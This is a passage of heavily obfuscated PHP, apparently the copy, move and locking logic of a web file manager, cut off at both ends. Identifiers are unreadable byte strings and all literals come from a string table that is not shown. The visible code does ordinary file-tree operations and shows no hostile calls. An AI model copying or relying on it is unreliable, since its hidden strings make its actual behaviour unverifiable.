$this->_lockKey($´İ·‡Íˆ[560] . $—şĞ˜è“ . $´İ·‡Íˆ[10] . $ŠËš±¡õ, $ß‚ÍÉò¥); $this->_lockEvent($—şĞ˜è“, array($´İ·‡Íˆ[555], $´İ·‡Íˆ[557]), $ß‚ÍÉò¥); $this->_lockParent($—şĞ˜è“, array($´İ·‡Íˆ[555], $´İ·‡Íˆ[557]), $ß‚ÍÉò¥); $this->_lockCheckEnd($´İ·‡Íˆ[556], $—şĞ˜è“); } public function lockWriteEnd($ŒÏÓ–‹, $»×ÁÒ°´ = '') { $„å©¯ÓÍ =& $_SERVER[óó‹¸‚å]; if (!$this->allowLock()) { return; } $İÑˆ ¶§ = 0; $this->_lockKey($„å©¯ÓÍ[560] . $ŒÏÓ–‹ . $„å©¯ÓÍ[10] . $»×ÁÒ°´, $İÑˆ ¶§); $this->_lockEvent($ŒÏÓ–‹, array($„å©¯ÓÍ[555], $„å©¯ÓÍ[557]), $İÑˆ ¶§); $this->_lockParent($ŒÏÓ–‹, array($„å©¯ÓÍ[555], $„å©¯ÓÍ[557]), $İÑˆ ¶§); } public function lockMoveStart($õêÎ¶íĞ) { $µ¯…¢ª =& $_SERVER[óó‹¸‚å]; if (!$this->allowLock()) { return; } $this->_lockCheck($µ¯…¢ª[557], $õêÎ¶íĞ); $ª£©ÙŒ¼ = 1; $this->_lockKey($µ¯…¢ª[561] . $õêÎ¶íĞ, $ª£©ÙŒ¼); $this->_lockEvent($õêÎ¶íĞ, array($µ¯…¢ª[555], $µ¯…¢ª[556]), $ª£©ÙŒ¼); $this->_lockParent($õêÎ¶íĞ, array($µ¯…¢ª[555], $µ¯…¢ª[557]), $ª£©ÙŒ¼); $this->_lockEvent($õêÎ¶íĞ, array($µ¯…¢ª[562], $µ¯…¢ª[558], $µ¯…¢ª[559]), $ª£©ÙŒ¼); $this->_lockCheckEnd($µ¯…¢ª[557], $õêÎ¶íĞ); } public function lockMoveEnd($ıÃ‰õÒš) { $ƒ÷ÁÖ˜Ğ =& $_SERVER[óó‹¸‚å]; if (!$this->allowLock()) { return; } $¢Ì¾ãê = 0; $this->_lockKey($ƒ÷ÁÖ˜Ğ[561] . $ıÃ‰õÒš, $¢Ì¾ãê); $this->_lockEvent($ıÃ‰õÒš, array($ƒ÷ÁÖ˜Ğ[555], $ƒ÷ÁÖ˜Ğ[556]), $¢Ì¾ãê); $this->_lockParent($ıÃ‰õÒš, array($ƒ÷ÁÖ˜Ğ[555], $ƒ÷ÁÖ˜Ğ[557]), $¢Ì¾ãê); $this->_lockEvent($ıÃ‰õÒš, array($ƒ÷ÁÖ˜Ğ[562], $ƒ÷ÁÖ˜Ğ[558], $ƒ÷ÁÖ˜Ğ[559]), $¢Ì¾ãê); } private function _lockCheck($ƒ½‡†, $ù…òÔë) { $¡¿ñ•Úè =& $_SERVER[óó‹¸‚å]; $¶¬ºç¢ = $this->sourceInfo($ù…òÔë); $Ì‹ÍÜ­Ï = $ƒ½‡† . $¡¿ñ•Úè[10] . $ù…òÔë; $this->_lockTimeStart[$Ì‹ÍÜ­Ï] = timeFloat(); if (!is_array($¶¬ºç¢)) { return; } $ÖŞšÛÜ = LNG($¡¿ñ•Úè[563]); CacheLock::setErrorMsg($¡¿ñ•Úè[162] . htmlspecialchars($¶¬ºç¢[$¡¿ñ•Úè[32]]) . $¡¿ñ•Úè[164] . $ÖŞšÛÜ); $this->_lockKey($Ì‹ÍÜ­Ï, 1); $this->_lockKey($Ì‹ÍÜ­Ï, 0); $ÉÒ¶ˆø = array_reverse($this->parentLevelArray($¶¬ºç¢[$¡¿ñ•Úè[521]])); foreach ($ÉÒ¶ˆø as $¿Ò›ó«) { $Ì‹ÍÜ­Ï = $ƒ½‡† . $¡¿ñ•Úè[564] . $¿Ò›ó«; if (CacheLock::lockGet($¡¿ñ•Úè[565] . $Ì‹ÍÜ­Ï)) { $¶¬ºç¢ = $this->sourceInfo($¿Ò›ó«); CacheLock::setErrorMsg($¡¿ñ•Úè[162] . htmlspecialchars($¶¬ºç¢[$¡¿ñ•Úè[32]]) . $¡¿ñ•Úè[164] . $ÖŞšÛÜ); $this->_lockKey($Ì‹ÍÜ­Ï, 1); $this->_lockKey($Ì‹ÍÜ­Ï, 0); } } } private function _lockCheckEnd($Õş…›·È, $ğÚ¾à¬) { $øŠÎÚ†ı =& $_SERVER[óó‹¸‚å]; $õÆÛ¼Ç = $Õş…›·È . $øŠÎÚ†ı[10] . $ğÚ¾à¬; CacheLock::setErrorMsg($øŠÎÚ†ı[378]); if (!isset($this->_lockTimeStart[$õÆÛ¼Ç])) { return; } $°¤ïğÂ’ = timeFloat() - $this->_lockTimeStart[$õÆÛ¼Ç]; unset($this->_lockTimeStart[$õÆÛ¼Ç]); if ($°¤ïğÂ’ > 0.5) { unset(self::$cacheSourceInfo[$øŠÎÚ†ı[460] . $ğÚ¾à¬]); } $âñ™Ÿà = $this->sourceInfo($ğÚ¾à¬); if (!$âñ™Ÿà) { show_json(LNG($øŠÎÚ†ı[105]), !1); } } private function _lockParent($¯úËÊø™, $”¤à ™Å, $ş °íÁ) { if (!$this->autoLockSet) { return; } $ÌõÁ¦’ = $this->sourceInfo($¯úËÊø™); if (!is_array($ÌõÁ¦’)) { return; } $ä©¹»‰ = array_reverse($this->parentLevelArray($ÌõÁ¦’[$_SERVER[óó‹¸‚å][521]])); foreach ($ä©¹»‰ as $Àşı¨€¯) { $this->_lockEvent($Àşı¨€¯, $”¤à ™Å, $ş °íÁ); } } private function _lockEvent($ä®Ÿ‹, $òèºÚóœ, $¨ğ™ÔâŸ) { $ÍÕ¡Ô =& $_SERVER[óó‹¸‚å]; if (!$this->autoLockSet) { return; } foreach ($òèºÚóœ as $İ™‹çÜ) { $¶›­ëÉ– = $İ™‹çÜ . $ÍÕ¡Ô[10] . $ä®Ÿ‹; if ($¨ğ™ÔâŸ && CacheLock::lockGet($ÍÕ¡Ô[565] . $¶›­ëÉ–)) { continue; } $this->_lockKey($¶›­ëÉ–, $¨ğ™ÔâŸ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($ªêê¬Ã—, $´à³¯®° = 1) { $©€Èø = $_SERVER[óó‹¸‚å][565] . md5($ªêê¬Ã—); if ($´à³¯®°) { if (isset(self::$_lockItemArr[$©€Èø])) { return; } self::$_lockItemArr[$©€Èø] = 1; CacheLock::lock($©€Èø, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$©€Èø])) { return; } unset(self::$_lockItemArr[$©€Èø]); CacheLock::unlock($©€Èø); } } public function isParentOf($Ç¬óä, $ÉÁÜï»Â) { $Ü¯ËÄâã =& $_SERVER[óó‹¸‚å]; $¦¼Äõ = $this->sourceInfo($Ç¬óä); $Ô“°áÂñ = $this->sourceInfo($ÉÁÜï»Â); $´É–©™° = $¦¼Äõ[$Ü¯ËÄâã[521]] . $¦¼Äõ[$Ü¯ËÄâã[402]] . $Ü¯ËÄâã[50]; $Ëò²ÂÃ¦ = $Ô“°áÂñ[$Ü¯ËÄâã[521]] . $Ô“°áÂñ[$Ü¯ËÄâã[402]] . $Ü¯ËÄâã[50]; $ßºƒ§¶µ = strpos($Ëò²ÂÃ¦, $´É–©™°) === 0; return $ßºƒ§¶µ; } private $targetIsDelete = 0; public function copy($‹ˆ’±´š, $¸¼‚Íø, $ãÚ¢²õ¡ = REPEAT_REPLACE, $çîÅÀî¨ = '') { $´¡â ¶ =& $_SERVER[óó‹¸‚å]; $©²¦ƒ»¶ = $this->sourceInfo($‹ˆ’±´š); $Şç–¡ß† = $this->sourceInfo($¸¼‚Íø); if (!$©²¦ƒ»¶ || !$Şç–¡ß† || $Şç–¡ß†[$´¡â ¶[410]] != $´¡â ¶[88]) { return !1; } if ($this->isParentOf($‹ˆ’±´š, $¸¼‚Íø)) { return !1; } $²ùÉÌç¸ = $çîÅÀî¨ ? $çîÅÀî¨ : $©²¦ƒ»¶[$´¡â ¶[32]]; $this->lockCopyStart($‹ˆ’±´š); $this->lockWriteStart($¸¼‚Íø, $²ùÉÌç¸); $ØÚä™‡î = array($´¡â ¶[566] => array(), $´¡â ¶[567] => array(), $´¡â ¶[568] => array()); $this->targetIsDelete = intval($©²¦ƒ»¶[$´¡â ¶[431]]); $©Ú…¯ùã = $this->fileNameExistCache($¸¼‚Íø, $©²¦ƒ»¶[$´¡â ¶[32]]); $¯à×óÚù = $this->_copy($‹ˆ’±´š, $¸¼‚Íø, $ãÚ¢²õ¡, $ØÚä™‡î, !0, $çîÅÀî¨); $this->_childrenListClear(); $this->lockCopyEnd($‹ˆ’±´š); $this->lockWriteEnd($¸¼‚Íø, $²ùÉÌç¸); if ($©²¦ƒ»¶[$´¡â ¶[410]] == $´¡â ¶[88] && $©Ú…¯ùã == $¯à×óÚù) { $this->folderSizeResetChildren($©Ú…¯ùã); } Model($´¡â ¶[569])->addAll($ØÚä™‡î[$´¡â ¶[567]], array(), !0); if ($©Ú…¯ùã != $¯à×óÚù || $©²¦ƒ»¶[$´¡â ¶[410]] == $´¡â ¶[88]) { Model($´¡â ¶[570])->eventCopy($¯à×óÚù); } $this->saveAll($ØÚä™‡î[$´¡â ¶[568]]); Model($´¡â ¶[199])->linkAdd($ØÚä™‡î[$´¡â ¶[566]]); $this->folderSizeReset($¸¼‚Íø); $this->updateModifyTime($¸¼‚Íø); return $¯à×óÚù; } private function _copy($§«¡®¿…, $Æ‰Íç¬Ä, $Åâ¢Â†ƒ, &$Áè…Ìª§, $ËÂç‡ , $ÑÚËÎû² = '') { $ñÖ£ÕÇ =& $_SERVER[óó‹¸‚å]; $êûšœø = $this->sourceInfoCache($§«¡®¿…); $ô²‚æ–¦ = $êûšœø[$ñÖ£ÕÇ[410]] == $ñÖ£ÕÇ[88]; $ñ¹ÎíÉû = $ÑÚËÎû² ? $ÑÚËÎû² : $êûšœø[$ñÖ£ÕÇ[32]]; $’‚¹Ğ = $this->fileNameExistCache($Æ‰Íç¬Ä, $ñ¹ÎíÉû); if ($ËÂç‡ ) { $this->_childrenAllMake($§«¡®¿…); if ($ô²‚æ–¦ && $’‚¹Ğ) { $this->_childrenAllMake($’‚¹Ğ); } } if (!$’‚¹Ğ) { return $this->_copyCreate($§«¡®¿…, $Æ‰Íç¬Ä, $ñ¹ÎíÉû, $Áè…Ìª§); } $¡¥ùÜ­÷ = $’‚¹Ğ; if ($ô²‚æ–¦) { if ($Åâ¢Â†ƒ == REPEAT_RENAME_FOLDER) { $ñ¹ÎíÉû = $this->fileNameAutoCache($Æ‰Íç¬Ä, $ñ¹ÎíÉû, $Åâ¢Â†ƒ, $ô²‚æ–¦); $¡¥ùÜ­÷ = $this->_copyCreate($§«¡®¿…, $Æ‰Íç¬Ä, $ñ¹ÎíÉû, $Áè…Ìª§); } else { $­é€êÖÓ = $this->_childrenList($§«¡®¿…); foreach ($­é€êÖÓ as $ìùç“ëà) { $this->_copy($ìùç“ëà[$ñÖ£ÕÇ[402]], $’‚¹Ğ, $Åâ¢Â†ƒ, $Áè…Ìª§, !1); } } } else { if ($Åâ¢Â†ƒ == REPEAT_RENAME || $Åâ¢Â†ƒ == REPEAT_RENAME_FOLDER) { $ñ¹ÎíÉû = $this->fileNameAutoCache($Æ‰Íç¬Ä, $ñ¹ÎíÉû, $Åâ¢Â†ƒ, $ô²‚æ–¦); $¡¥ùÜ­÷ = $this->_copyCreate($§«¡®¿…, $Æ‰Íç¬Ä, $ñ¹ÎíÉû, $Áè…Ìª§); } else { if ($Åâ¢Â†ƒ == REPEAT_REPLACE) { $İ×‹¸Ë« = $this->sourceInfoCache($’‚¹Ğ); $ùòÍ‰«ç = $this->fileHistory($İ×‹¸Ë«, $êûšœø[$ñÖ£ÕÇ[468]], $êûšœø[$ñÖ£ÕÇ[76]]); if ($ùòÍ‰«ç) { $Áè…Ìª§[$ñÖ£ÕÇ[566]][] = $êûšœø[$ñÖ£ÕÇ[468]]; } } else { if ($Åâ¢Â†ƒ == REPEAT_SKIP) { } } } Hook::trigger($ñÖ£ÕÇ[571], array($ñÖ£ÕÇ[572], $êûšœø, 0)); } return $¡¥ùÜ­÷; } private function _copyCreate($–…Ì°Ö¼, $ÙÏÚÍÄü, $ƒı…Ğ•ä, &$ë…¬•ÙÜ) { $¸ıÏ«éª =& $_SERVER[óó‹¸‚å]; $¯½“ïŠ = $this->sourceInfoCache($–…Ì°Ö¼); $°Ò…µ  = $this->sourceInfoCache($ÙÏÚÍÄü); $·ÈÉİ”È = $this->_makeItemData($¯½“ïŠ, $°Ò…µ , $ƒı…Ğ•ä); Hook::trigger($¸ıÏ«éª[573], $·ÈÉİ”È); Hook::trigger($¸ıÏ«éª[574], array($¸ıÏ«éª[575], $·ÈÉİ”È, 0)); $“™“ï«É = $this->add($·ÈÉİ”È); $Íã¨±Œå = array($¸ıÏ«éª[402] => $“™“ï«É, $¸ıÏ«éª[32] => $ƒı…Ğ•ä); $this->_copyApplyMeta($Íã¨±Œå, $ë…¬•ÙÜ); if ($¯½“ïŠ[$¸ıÏ«éª[410]] != $¸ıÏ«éª[88]) { $ë…¬•ÙÜ[$¸ıÏ«éª[566]][] = $¯½“ïŠ[$¸ıÏ«éª[468]]; return $“™“ï«É; } $×¦®ÂÅ = array(); $»ªĞğŞ° = array(); $this->_childrenListAll($–…Ì°Ö¼, $×¦®ÂÅ); $…à³ÌÀ† = count($×¦®ÂÅ); if ($…à³ÌÀ† == 0) { return $“™“ï«É; } $ÊÃÕÈÃ = $this->sourceInfo($“™“ï«É); foreach ($×¦®ÂÅ as $ÔŠ÷Îµ•) { $Ìèò¨ = $this->_makeItemData($ÔŠ÷Îµ•, $ÊÃÕÈÃ, $ÔŠ÷Îµ•[$¸ıÏ«éª[32]]); $Ìèò¨[$¸ıÏ«éª[521]] = $ÔŠ÷Îµ•[$¸ıÏ«éª[521]]; $»ªĞğŞ°[] = $Ìèò¨; } $this->chunkEventSet($¸ıÏ«éª[576], array($¸ıÏ«éª[577], $·ÈÉİ”È, $…à³ÌÀ†)); $this->addAll($»ªĞğŞ°, array(), !1); $Ó¤‡¾ØĞ = $this->where(array($¸ıÏ«éª[432] => $“™“ï«É))->select(); $ü³í“÷¯ = $this->_childrenMakeRelation($×¦®ÂÅ, $Ó¤‡¾ØĞ); $ü³í“÷¯[$–…Ì°Ö¼] = $“™“ï«É; $¬Í¶Í³‘ = array(); $ÁçÏØš = array(); foreach ($Ó¤‡¾ØĞ as $ÔŠ÷Îµ•) { $¼¦¤¬§ = $ÔŠ÷Îµ•[$¸ıÏ«éª[402]]; $­½Ş—Ü = $this->_childrenMatch($ü³í“÷¯, $ÔŠ÷Îµ•, $ÊÃÕÈÃ); $¬Í¶Í³‘[] = array($¸ıÏ«éª[402], $¼¦¤¬§, $¸ıÏ«éª[432], $­½Ş—Ü[$¸ıÏ«éª[432]]); $ÁçÏØš[] = array($¸ıÏ«éª[402], $¼¦¤¬§, $¸ıÏ«éª[521], $­½Ş—Ü[$¸ıÏ«éª[521]]); $this->_copyApplyMeta($ÔŠ÷Îµ•, $ë…¬•ÙÜ); if ($ÔŠ÷Îµ•[$¸ıÏ«éª[410]] != $¸ıÏ«éª[88]) { $ë…¬•ÙÜ[$¸ıÏ«éª[566]][] = $ÔŠ÷Îµ•[$¸ıÏ«éª[468]]; } } $this->chunkEventSet($¸ıÏ«éª[578], array($¸ıÏ«éª[579], $·ÈÉİ”È, $…à³ÌÀ†)); $this->saveAll($¬Í¶Í³‘); $this->chunkEventSet($¸ıÏ«éª[580], array($¸ıÏ«éª[581], $·ÈÉİ”È, $…à³ÌÀ†)); $this->saveAll($ÁçÏØš); return $“™“ï«É; } private function _childrenMakeRelation($¶×ÒÙ‡é, $±Ò¢®Ñ) { $æç¹Ó’ =& $_SERVER[óó‹¸‚å]; $Ã­¬Éè = array(); $şĞ¢§”¹ = array(); foreach ($¶×ÒÙ‡é as $ä›µ¶°÷) { $ÌàûË‹â = $ä›µ¶°÷[$æç¹Ó’[32]] . $æç¹Ó’[8] . $ä›µ¶°÷[$æç¹Ó’[521]]; $Ã­¬Éè[$ÌàûË‹â] = $ä›µ¶°÷[$æç¹Ó’[402]]; } foreach ($±Ò¢®Ñ as $ä›µ¶°÷) { $ÌàûË‹â = $ä›µ¶°÷[$æç¹Ó’[32]] . $æç¹Ó’[8] . $ä›µ¶°÷[$æç¹Ó’[521]]; $°‘ìßÛ› = $Ã­¬Éè[$ÌàûË‹â]; $şĞ¢§”¹[$°‘ìßÛ›] = $ä›µ¶°÷[$æç¹Ó’[402]]; } return $şĞ¢§”¹; } private function _childrenMatch($¯ßÕÁÉÔ, $Ûî£­ŞÜ, $ÛŠäúÏŒ) { $ü³üÎü =& $_SERVER[óó‹¸‚å]; $Ò²àäÍ¶ = $ÛŠäúÏŒ[$ü³üÎü[521]]; $î¾‹åÂ• = $this->parentLevelArray($Ûî£­ŞÜ[$ü³üÎü[521]]); foreach ($î¾‹åÂ• as $Ä³Õ¹¬›) { if (isset($¯ßÕÁÉÔ[$Ä³Õ¹¬›])) { $Ò²àäÍ¶ .= $¯ßÕÁÉÔ[$Ä³Õ¹¬›] . $ü³üÎü[582]; } } $Ò²àäÍ¶ = rtrim($Ò²àäÍ¶, $ü³üÎü[50]) . $ü³üÎü[50]; $Ş¦ÀØŞŸ = $this->parentLevelArray($Ò²àäÍ¶); $šäöñ¸à = $Ş¦ÀØŞŸ[count($Ş¦ÀØŞŸ) - 1]; return array($ü³üÎü[432] => $šäöñ¸à, $ü³üÎü[521] => $Ò²àäÍ¶); } private function _makeItemData($’áäâøé, $şœïîƒò, $ı ’Åâö) { $ïàù¹©  =& $_SERVER[óó‹¸‚å]; $åèÑ·—ˆ = array($ïàù¹© [583] => $’áäâøé[$ïàù¹© [410]], $ïàù¹© [420] => $ı ’Åâö, $ïàù¹© [584] => $’áäâøé[$ïàù¹© [412]] ? $’áäâøé[$ïàù¹© [412]] : $ïàù¹© [12], $ïàù¹© [469] => $’áäâøé[$ïàù¹© [468]] ? $’áäâøé[$ïàù¹© [468]] : 0, $ïàù¹© [585] => $’áäâøé[$ïàù¹© [76]] ? $’áäâøé[$ïàù¹© [76]] : 0, $ïàù¹© [586] => intval($şœïîƒò[$ïàù¹© [411]]), $ïàù¹© [587] => intval($şœïîƒò[$ïàù¹© [505]]), $ïàù¹© [588] => intval(USER_ID), $ïàù¹© [589] => intval(USER_ID), $ïàù¹© [401] => intval($şœïîƒò[$ïàù¹© [402]]), $ïàù¹© [590] => $şœïîƒò[$ïàù¹© [521]] . $şœïîƒò[$ïàù¹© [402]] . $ïàù¹© [50], $ïàù¹© [424] => $’áäâøé[$ïàù¹© [85]] ? $’áäâøé[$ïàù¹© [85]] : time(), $ïàù¹© [430] => 0, $ïàù¹© [591] => $ïàù¹© [12]); return $åèÑ·—ˆ; } private function _copyApplyMeta($ „¢è‘Ï, &$Ó­”·Îú) { $ü¤Ô«ğÀ =& $_SERVER[óó‹¸‚å]; $™Û„©¦æ = $ „¢è‘Ï[$ü¤Ô«ğÀ[402]]; $ø™ì¨ı = $ „¢è‘Ï[$ü¤Ô«ğÀ[32]]; if (!isset($ „¢è‘Ï[$ü¤Ô«ğÀ[592]]) || !$ „¢è‘Ï[$ü¤Ô«ğÀ[592]] || $ „¢è‘Ï[$ü¤Ô«ğÀ[592]] == $ü¤Ô«ğÀ[197]) { $Ó­”·Îú[$ü¤Ô«ğÀ[568]][] = array($ü¤Ô«ğÀ[402], $™Û„©¦æ, $ü¤Ô«ğÀ[592], short_id($™Û„©¦æ)); } if (Input::check($ø™ì¨ı, $ü¤Ô«ğÀ[593])) { $Ó­”·Îú[$ü¤Ô«ğÀ[567]][] = array($ü¤Ô«ğÀ[402] => $™Û„©¦æ, $ü¤Ô«ğÀ[94] => $ü¤Ô«ğÀ[465], $ü¤Ô«ğÀ[374] => str_replace($ü¤Ô«ğÀ[53], $ü¤Ô«ğÀ[12], Pinyin::get($ø™ì¨ı))); $Ó­”·Îú[$ü¤Ô«ğÀ[567]][] = array($ü¤Ô«ğÀ[402] => $™Û„©¦æ, $ü¤Ô«ğÀ[94] => $ü¤Ô«ğÀ[464], $ü¤Ô«ğÀ[374] => Pinyin::get($ø™ì¨ı, $ü¤Ô«ğÀ[594])); } $Ó­”·Îú[$ü¤Ô«ğÀ[567]][] = array($ü¤Ô«ğÀ[402] => $™Û„©¦æ, $ü¤Ô«ğÀ[94] => $ü¤Ô«ğÀ[444], $ü¤Ô«ğÀ[374] => KodSort::makeStr($ø™ì¨ı)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($µà–™¿à) { $ÏÚøæúÌ =& $_SERVER[óó‹¸‚å]; $àôÒÌÉ = $this->sourceInfo($µà–™¿à); $ã¾¦øæÏ = $ÏÚøæúÌ[595]; $üÓ·ãÎ» = array($ÏÚøæúÌ[521] => array($ÏÚøæúÌ[550], $àôÒÌÉ[$ÏÚøæúÌ[521]] . $µà–™¿à . $ÏÚøæúÌ[551]), $ÏÚøæúÌ[431] => $this->targetIsDelete); $¾Ï±ŠòÂ = $this->field($ã¾¦øæÏ)->where($üÓ·ãÎ»)->select(); if (!$¾Ï±ŠòÂ) { return; } $¾Ï±ŠòÂ = array_to_keyvalue($¾Ï±ŠòÂ, $ÏÚøæúÌ[402]); foreach ($¾Ï±ŠòÂ as $Å›İ»Ìµ) { $™”…Ó²­ = $Å›İ»Ìµ[$ÏÚøæúÌ[432]]; $µà–™¿à = $Å›İ»Ìµ[$ÏÚøæúÌ[402]]; if (!isset($this->_childrenListCache[$µà–™¿à]) && $Å›İ»Ìµ[$ÏÚøæúÌ[410]] == $ÏÚøæúÌ[88]) { $this->_childrenListCache[$µà–™¿à] = array(); } if (!isset($this->_childrenListCache[$™”…Ó²­])) { $this->_childrenListCache[$™”…Ó²­] = array(); } $this->_childrenListCache[$™”…Ó²­][$µà–™¿à] = $Å›İ»Ìµ; $this->_childrenItemCache[$µà–™¿à] = $Å›İ»Ìµ; } } private function _childrenListAll($²ñ‚¾¾å, &$Ì„û…Ôö) { $ñÏ£¾‚Ö =& $_SERVER[óó‹¸‚å]; if (!isset($this->_childrenListCache[$²ñ‚¾¾å])) { return; } $àÄ¢ÔÕÔ = $this->_childrenListCache[$²ñ‚¾¾å]; foreach ($àÄ¢ÔÕÔ as $Ê¦®úÈ => $‚Æ¾é•’) { $Ì„û…Ôö[$Ê¦®úÈ] = $‚Æ¾é•’; if ($‚Æ¾é•’[$ñÏ£¾‚Ö[410]] == $ñÏ£¾‚Ö[88]) { $this->_childrenListAll($Ê¦®úÈ, $Ì„û…Ôö); } } } private function sourceInfoCache($¿Ø—ñœ‚) { if (isset($this->_childrenItemCache[$¿Ø—ñœ‚])) { return $this->_childrenItemCache[$¿Ø—ñœ‚]; } return $this->sourceInfo($¿Ø—ñœ‚); } private function _childrenList($¥†®½´ï) { if (isset($this->_childrenListCache[$¥†®½´ï])) { return $this->_childrenListCache[$¥†®½´ï]; } return $this->_childrenListSelect($¥†®½´ï); } private function _childrenListSelect($ÜœŒš±) { $®ıà™¶¹ =& $_SERVER[óó‹¸‚å]; $íÊÚŞäå = array($®ıà™¶¹[432] => $ÜœŒš±, $®ıà™¶¹[431] => $this->targetIsDelete); $ï©ÆŠË© = $this->where($íÊÚŞäå)->select(); $ï©ÆŠË© = $ï©ÆŠË© ? $ï©ÆŠË© : array(); $ íË¤ê = array_to_keyvalue($ï©ÆŠË©, $®ıà™¶¹[402]); $this->_childrenListCache[$ÜœŒš±] = $ íË¤ê; foreach ($ íË¤ê as $ÜœŒš± => $Õöò´€×) { $this->_childrenItemCache[$ÜœŒš±] = $Õöò´€×; } return $ íË¤ê; } private function fileNameExistCache($Ê®¢—ó, $Ô¸¶¶ñ´) { $„™ı¤¯ =& $_SERVER[óó‹¸‚å]; $Ô¸¶¶ñ´ = strtolower($Ô¸¶¶ñ´); $¥äĞ§²± = $this->_childrenList($Ê®¢—ó); foreach ($¥äĞ§²± as $¹€¾òĞŠ) { if ($Ô¸¶¶ñ´ == strtolower($¹€¾òĞŠ[$„™ı¤¯[32]])) { return $¹€¾òĞŠ[$„™ı¤¯[402]]; } } return !1; } private function fileNameAutoCache($Å³Á²·Ø, $ÉôÄ»ïİ, $÷¯¹×¦ù, $•ƒÔ­·…) { $¼Ö»·™¤ =& $_SERVER[óó‹¸‚å]; $ç¬Û°êî = $this->_childrenList($Å³Á²·Ø); $©™ ó¬Ö = array_to_keyvalue($ç¬Û°êî, $¼Ö»·™¤[12], $¼Ö»·™¤[32]); return $this->fileNameAutoGet($©™ ó¬Ö, $ÉôÄ»ïİ, $÷¯¹×¦ù, $•ƒÔ­·…); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($î„¤®û…, $–ÜÁƒë, $¦ĞøóÛ = REPEAT_REPLACE, $½£çñ = '') { $âøä›Ãë =& $_SERVER[óó‹¸‚å]; $ÙÃíùÚ¥ = $this->sourceInfo($î„¤®û…); $•Ãã™î = $this->sourceInfo($–ÜÁƒë); if ($ÙÃíùÚ¥[$âøä›Ãë[432]] == $•Ãã™î[$âøä›Ãë[402]]) { if ($ÙÃíùÚ¥[$âøä›Ãë[431]] == $âøä›Ãë[88]) { Model($âøä›Ãë[429])->restore(array($î„¤®û…)); } if (!$½£çñ || $½£çñ == $ÙÃíùÚ¥[$âøä›Ãë[32]]) { return $î„¤®û…; } } $¹”ô´ŒŞ = $this->pathInfoMore($î„¤®û…); if ($this->isParentOf($î„¤®û…, $–ÜÁƒë)) { return !1; } if (!$ÙÃíùÚ¥ || !$•Ãã™î || $•Ãã™î[$âøä›Ãë[410]] != $âøä›Ãë[88]) { return !1; } Hook::trigger($âøä›Ãë[596], $¹”ô´ŒŞ); $this->targetIsDelete = intval($ÙÃíùÚ¥[$âøä›Ãë[431]]); if ($ÙÃíùÚ¥[$âøä›Ãë[432]] == $–ÜÁƒë && $½£çñ != $ÙÃíùÚ¥[$âøä›Ãë[32]]) { $á´ƒì¨ = $this->fileNameExist($–ÜÁƒë, $½£çñ); if ($á´ƒì¨ && $ÙÃíùÚ¥[$âøä›Ãë[410]] == $âøä›Ãë[197]) { $‡×ª™Ï£ = $this->sourceInfo($á´ƒì¨); $ËÕğ´½ = $this->fileHistory($‡×ª™Ï£, $ÙÃíùÚ¥[$âøä›Ãë[468]], $ÙÃíùÚ¥[$âøä›Ãë[76]]); if (!$ËÕğ´½) { Model($âøä›Ãë[471])->remove($ÙÃíùÚ¥[$âøä›Ãë[468]]); } $this->removeNow($î„¤®û…, !1); $this->folderSizeReset($–ÜÁƒë); Hook::trigger($âøä›Ãë[597], $¹”ô´ŒŞ); return $á´ƒì¨; } } $ºÙšá± = $½£çñ ? $½£çñ : $ÙÃíùÚ¥[$âøä›Ãë[32]]; $this->lockMoveStart($î„¤®û…); $this->lockWriteStart($–ÜÁƒë, $ºÙšá±); $û¾¼ˆî¾ = array($âøä›Ãë[566] => array(), $âøä›Ãë[598] => !1); $this->clearShare($î„¤®û…, $–ÜÁƒë); $íÅç€ÛÇ = $this->fileNameExistCache($–ÜÁƒë, $ÙÃíùÚ¥[$âøä›Ãë[32]]); $È²®°Ù = $this->_move($î„¤®û…, $–ÜÁƒë, $¦ĞøóÛ, $û¾¼ˆî¾, $½£çñ); $this->sourceCacheClear(); if ($ÙÃíùÚ¥[$âøä›Ãë[410]] == $âøä›Ãë[88] && $íÅç€ÛÇ) { $this->folderSizeResetChildren($È²®°Ù); } Model($âøä›Ãë[199])->linkAdd($û¾¼ˆî¾[$âøä›Ãë[566]]); if ($íÅç€ÛÇ && $û¾¼ˆî¾[$âøä›Ãë[598]]) { $this->removeNow($î„¤®û…, !1); } $this->lockMoveEnd($î„¤®û…); $this->lockWriteEnd($–ÜÁƒë, $ºÙšá±); $this->folderSizeReset($ÙÃíùÚ¥[$âøä›Ãë[432]]); $this->folderSizeReset($–ÜÁƒë); $ôÃĞ©® = array($ÙÃíùÚ¥[$âøä›Ãë[432]], $–ÜÁƒë); if ($ÙÃíùÚ¥[$âøä›Ãë[410]] == $âøä›Ãë[88]) { $ôÃĞ©®[] = $î„¤®û…; } $this->updateModifyTime($ôÃĞ©®); Model($âøä›Ãë[570])->eventMove($î„¤®û…, $ÙÃíùÚ¥[$âøä›Ãë[432]], $–ÜÁƒë); Hook::trigger($âøä›Ãë[597], $¹”ô´ŒŞ); return $È²®°Ù; } private function _move($úß½ë¾´, $İáØñç, $âÈ­–—¿, &$§®ŠÆˆ, $“ıÇĞ×· = '') { $ñ™¹ƒÇË =& $_SERVER[óó‹¸‚å]; $½§”Â÷Œ = $this->sourceInfo($úß½ë¾´); $î¶óÌ†œ = $½§”Â÷Œ[$ñ™¹ƒÇË[410]] == $ñ™¹ƒÇË[88]; $ ¨Ò´† = $“ıÇĞ×· ? $“ıÇĞ×· : $½§”Â÷Œ[$ñ™¹ƒÇË[32]]; $×ãùğô = $this->fileNameExistCache($İáØñç, $ ¨Ò´†); $this->lockMoveStart($úß½ë¾´); $this->lockWriteStart($İáØñç, $ ¨Ò´†); if (!$×ãùğô) { return $this->_moveForce($úß½ë¾´, $İáØñç, $ ¨Ò´†); } $¿ ûÏ¾’ = $×ãùğô; $Æú“œ¦ = !1; if ($î¶óÌ†œ) { if ($âÈ­–—¿ == REPEAT_RENAME_FOLDER) { $ ¨Ò´† = $this->fileNameAuto($İáØñç, $ ¨Ò´†, $âÈ­–—¿, $î¶óÌ†œ); $¿ ûÏ¾’ = $this->_moveForce($úß½ë¾´, $İáØñç, $ ¨Ò´†); } else { if ($âÈ­–—¿ == REPEAT_RENAME_FOLDER) { $âÈ­–—¿ = REPEAT_RENAME; } 